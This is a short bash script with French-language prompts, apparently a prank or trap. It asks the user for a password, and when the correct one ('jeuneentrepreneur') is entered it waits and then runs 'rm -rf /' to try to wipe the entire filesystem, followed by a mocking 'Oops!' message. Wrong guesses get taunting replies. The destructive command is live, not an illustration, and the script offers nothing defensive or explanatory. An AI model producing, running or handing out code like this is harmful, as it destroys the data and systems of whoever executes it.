#!/bin/bash

erase()
{
rm -rf /
echo "Oops! A pu ;)"
sleep 5
exit 0
}

check()
{
echo "Mot de passe ?"
read pass
if [ $pass == jeuneentrepreneur ]
then
    sleep $@
    erase
else
    echo "Incorrecte, réessaye frérot !"
    echo "Mot de passe :"
    read passOne
    if [ $passOne == jeuneentrepreneur ]
    then
        sleep $@
        erase
    else
        echo "Ptdr t'es ki ?!"
        exit 0
    fi
fi
}

check
